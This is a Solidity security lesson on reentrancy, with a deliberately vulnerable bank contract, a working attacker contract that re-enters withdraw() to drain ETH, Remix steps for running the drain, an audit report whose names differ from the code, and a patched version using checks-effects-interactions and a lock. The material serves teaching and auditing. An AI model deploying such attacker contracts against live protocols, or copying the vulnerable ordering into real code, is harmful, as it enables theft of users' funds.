// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: Make external call before state update
CONCEPT: Reentrancy risk
=========================================================

OBJECTIVE

- Learn how reentrancy vulnerabilities happen
- Understand dangerous execution ordering
- Learn why external calls are risky
- Think like attacker + auditor

---------------------------------------------------------
CORE IDEA
---------------------------------------------------------

If external call happens BEFORE state update:

attacker may reenter function
before storage changes occur.

---------------------------------------------------------
IMPORTANT UNDERSTANDING
---------------------------------------------------------

External calls transfer:
execution control outside your contract.

---------------------------------------------------------

Called contract may:
- call back
- manipulate execution
- drain funds
- exploit temporary state

---------------------------------------------------------
WHY THIS MATTERS
---------------------------------------------------------

Reentrancy caused:
one of the most famous hacks in Ethereum history.

---------------------------------------------------------
REAL-WORLD USAGE
---------------------------------------------------------

External calls occur in:

- ETH withdrawals
- token transfers
- staking systems
- vaults
- bridges
- lending protocols

---------------------------------------------------------
AUDITOR FOCUS
---------------------------------------------------------

Auditors inspect:

- external-call ordering
- state-update timing
- reentrancy windows
- CEI violations
- callback attack surface

=========================================================
VULNERABLE CONTRACT
=========================================================
*/

contract VulnerableBankVul {

    /*
        USER BALANCES
    */
    mapping(address => uint256) public balances;

    /*
    =====================================================
    DEPOSIT ETH
    =====================================================
    */

    function deposit()
        external
        payable
    {

        /*
            Store deposited ETH.
        */
        balances[msg.sender] += msg.value;
    }

    /*
    =====================================================
    VULNERABLE WITHDRAW
    =====================================================

    BAD ORDER:
    external call BEFORE state update.
    */

    function withdraw(
        uint256 _amount
    )
        external
    {

        /*
            CHECK:
            user must have balance.
        */
        require(
            balances[msg.sender] >= _amount,
            "Insufficient balance"
        );

        /*
            DANGEROUS EXTERNAL CALL

            Control leaves contract HERE.
        */
        (bool success, ) =
            payable(msg.sender).call{
                value: _amount
            }("");

        require(
            success,
            "Transfer failed"
        );

        /*
            STATE UPDATED TOO LATE

            Vulnerability exists because:
            attacker can reenter BEFORE this line.
        */
        balances[msg.sender] -= _amount;
    }

    /*
    =====================================================
    CHECK CONTRACT BALANCE
    =====================================================
    */

    function contractBalance()
        external
        view
        returns (uint256)
    {

        return address(this).balance;
    }
}

/*
=========================================================
ATTACKER CONTRACT
=========================================================
*/

contract ReentrancyAttackerVul {

    /*
        TARGET CONTRACT
    */
    VulnerableBankVul public target;

    /*
        OWNER
    */
    address public owner;

    /*
        ATTACK COUNTER
    */
    uint256 public attackCounter;

    /*
        LIMIT ATTACK LOOPS
    */
    uint256 public constant MAX_ATTACKS = 3;

    /*
        CONSTRUCTOR
    */
    constructor(address _target)
    {

        target = VulnerableBankVul(_target);

        owner = msg.sender;
    }

    /*
    =====================================================
    DEPOSIT INTO TARGET
    =====================================================
    */

    function depositToTarget()
        external
        payable
    {

        /*
            Deposit ETH into victim contract.
        */
        target.deposit{value: msg.value}();
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    */

    function attack()
        external
    {

        /*
            Trigger first withdraw.
        */
        target.withdraw(1 ether);
    }

    /*
    =====================================================
    RECEIVE FUNCTION
    =====================================================

    Automatically executes when
    target sends ETH.
    */

    receive()
        external
        payable
    {

        /*
            Reenter while target still has ETH.
        */
        if (
            address(target).balance >= 1 ether
            &&
            attackCounter < MAX_ATTACKS
        ) {

            attackCounter++;

            /*
                REENTER TARGET

                Balance NOT updated yet.
            */
            target.withdraw(1 ether);
        }
    }

    /*
    =====================================================
    WITHDRAW STOLEN ETH
    =====================================================
    */

    function withdrawLoot()
        external
    {

        require(
            msg.sender == owner,
            "Not owner"
        );

        payable(owner).transfer(
            address(this).balance
        );
    }
}

/*
=========================================================
EXECUTION FLOW
=========================================================

STEP 1:
Deploy VulnerableBank

---------------------------------------------------------

STEP 2:
Fund VulnerableBank with ETH

=========================================================
STEP 3
=========================================================

Deploy ReentrancyAttacker

Constructor input:
VulnerableBank address

=========================================================
STEP 4
=========================================================

Call:
depositToTarget()

VALUE:
1 ETH

---------------------------------------------------------

Attacker now has:
1 ETH balance in target.

=========================================================
STEP 5
=========================================================

Call:
attack()

=========================================================
CRITICAL EXECUTION TRACE
=========================================================

STEP 1:
target.withdraw(1 ether)

---------------------------------------------------------

Balance check passes.

=========================================================
STEP 2
=========================================================

External call executes:

call{value: 1 ether}()

---------------------------------------------------------

CONTROL LEAVES:
VulnerableBank

---------------------------------------------------------

Execution enters:
Attacker.receive()

=========================================================
STEP 3
=========================================================

Inside receive():

attacker reenters:
target.withdraw(1 ether)

=========================================================
IMPORTANT
=========================================================

Target balance storage:
NOT updated yet.

---------------------------------------------------------

balances[attacker]
still equals:
1 ETH

---------------------------------------------------------

Withdraw succeeds AGAIN.

=========================================================
STEP 4
=========================================================

Attack loops repeatedly.

---------------------------------------------------------

Multiple withdrawals occur
before balance reduction.

=========================================================
FINAL RESULT
=========================================================

Attacker drains ETH
from victim contract.

=========================================================
WHY VULNERABILITY EXISTS
=========================================================

BAD ORDER:

---------------------------------------------------------
INTERACTION
---------------------------------------------------------

External ETH call

BEFORE

---------------------------------------------------------
EFFECTS
---------------------------------------------------------

Storage update

=========================================================
SAFE PATTERN
=========================================================

Checks
    ->
Effects
    ->
Interactions

---------------------------------------------------------

Known as:
CEI pattern.

=========================================================
SAFE VERSION
=========================================================

CORRECT ORDER:

---------------------------------------------------------
STEP 1
---------------------------------------------------------

Validate balance

---------------------------------------------------------
STEP 2
---------------------------------------------------------

Reduce balance FIRST

---------------------------------------------------------
STEP 3
---------------------------------------------------------

Send ETH LAST

=========================================================
SAFE EXAMPLE
=========================================================

function safeWithdraw(uint256 amount)
external
{
    require(
        balances[msg.sender] >= amount
    );

    balances[msg.sender] -= amount;

    (bool success, ) =
        payable(msg.sender).call{
            value: amount
        }("");

    require(success);
}

=========================================================
REMIX TESTING
=========================================================

STEP 1:
Deploy VulnerableBank

---------------------------------------------------------

STEP 2:
Deposit several ETH into bank

---------------------------------------------------------

STEP 3:
Deploy ReentrancyAttacker

Input:
bank address

---------------------------------------------------------

STEP 4:
Call:
depositToTarget()

VALUE:
1 ETH

---------------------------------------------------------

STEP 5:
Call:
attack()

---------------------------------------------------------

STEP 6:
Observe:

Victim ETH balance drops repeatedly.

---------------------------------------------------------

STEP 7:
Call:
attackCounter()

EXPECTED:
multiple attack rounds

=========================================================
VERY IMPORTANT SECURITY CONCEPT
=========================================================

Every external call =
potential reentrancy point.

---------------------------------------------------------

Especially:

- call()
- transfer()
- token callbacks
- fallback()
- receive()

=========================================================
COMMON AUDIT RISKS
=========================================================

---------------------------------------------------------
1. STATE UPDATE AFTER CALL
---------------------------------------------------------

Classic reentrancy vulnerability.

---------------------------------------------------------
2. NESTED EXTERNAL CALLS
---------------------------------------------------------

Complex recursive execution risk.

---------------------------------------------------------
3. CALLBACK ATTACKS
---------------------------------------------------------

Receiver manipulates control flow.

---------------------------------------------------------
4. CROSS-FUNCTION REENTRANCY
---------------------------------------------------------

Different functions abused together.

=========================================================
IMPORTANT ATTACK THINKING
=========================================================

Attackers search for:

- external calls
- delayed state updates
- fallback execution
- recursive entry points

---------------------------------------------------------

Then:
build malicious receiver contracts.

=========================================================
REAL AUDITOR PROCESS
=========================================================

Auditors trace:

1. External interaction timing
2. Storage-update order
3. Reentrancy windows
4. Recursive execution paths
5. ETH transfer flow

=========================================================
HOW AUDITORS FIX THIS
=========================================================

---------------------------------------------------------
FIX 1
---------------------------------------------------------

Use CEI pattern.

---------------------------------------------------------
FIX 2
---------------------------------------------------------

Use ReentrancyGuard.

---------------------------------------------------------
FIX 3
---------------------------------------------------------

Minimize external interactions.

=========================================================
MINI CHALLENGE
=========================================================

Modify contract so that:

1. Add safeWithdraw()
2. Add nonReentrant modifier
3. Compare vulnerable vs safe flow
4. Emit events during attack

BONUS:
Create cross-function reentrancy attack.

=========================================================
IMPORTANT CONCEPTS LEARNED
=========================================================

- External calls transfer execution control
- Reentrancy exploits bad ordering
- State updates after calls are dangerous
- call() creates major attack surface
- receive()/fallback() enable reentry
- CEI pattern improves security
- Reentrancy drains funds recursively
- Auditors inspect every external call
- Execution order is security critical
- Reentrancy is one of Solidity's most important vulnerabilities

=========================================================
*/


/*
Audit Report

Title:
Reentrancy Vulnerability in vulnerableWithdraw()

Severity:
Critical

Reason:
The contract performs an external ETH transfer before updating the user's balance, allowing a malicious contract to reenter the function multiple times and withdraw funds repeatedly.

Location:
Contract: VictimBankVul
Function: vulnerableWithdraw()

Vulnerability Description:
The vulnerableWithdraw() function violates the Checks-Effects-Interactions (CEI) security pattern.
The function sends ETH to msg.sender before updating the user's balance:

(bool success, ) =
payable(msg.sender).call{
value: _amount
}("");

The balance is reduced only after the external call:
balances[msg.sender] -= _amount;
If msg.sender is a malicious contract, its receive() function executes automatically when ETH is received. The attacker can reenter vulnerableWithdraw() before the balance is updated and perform multiple withdrawals using the same balance.

Impact:
An attacker can:
Withdraw more ETH than deposited
Drain ETH belonging to other users
Empty the contract balance
Cause complete loss of protocol funds

Proof of Concept:
Deploy VictimBankVul.
Fund VictimBankVul with multiple ETH.
Deploy MaliciousAttacker using the VictimBankVul address.

Call:
depositToVictim()

with:
1 ETH

Call:
attack()

Execution Flow:
victim.vulnerableWithdraw(1 ether)

Victim sends ETH
Attacker receive() executes automatically
receive() calls:

victim.vulnerableWithdraw(1 ether)
again before the balance is updated.
Because balances[msg.sender] is still unchanged, the withdrawal succeeds multiple times.

Result:
The attacker receives multiple ETH while depositing only 1 ETH and drains funds from the victim contract.

Root Cause:
The contract performs external interaction before updating internal state.

Current execution order:
CHECKS
→ INTERACTIONS
→ EFFECTS
The balance reduction occurs after the external call, creating a reentrancy window.

Recommendation:
Follow the Checks-Effects-Interactions (CEI) pattern.
Update balances before sending ETH.
Add a nonReentrant modifier.
Prevent recursive execution during withdrawals.
*/

//Patched Code:

contract VictimBank {

mapping(address => uint256) public balances;

bool private locked;

modifier nonReentrant() {
    require(!locked, "Reentrancy detected");

    locked = true;
    _;
    locked = false;
}

function deposit()
    external
    payable
{
    balances[msg.sender] += msg.value;
}

function secureWithdraw(
    uint256 _amount
)
    external
    nonReentrant
{
    require(
        balances[msg.sender] >= _amount,
        "Insufficient balance"
    );

    balances[msg.sender] -= _amount;

    (bool success, ) =
        payable(msg.sender).call{
            value: _amount
        }("");

    require(
        success,
        "Transfer failed"
    );
}

function contractBalance()
    external
    view
    returns (uint256)
{
    return address(this).balance;
}

}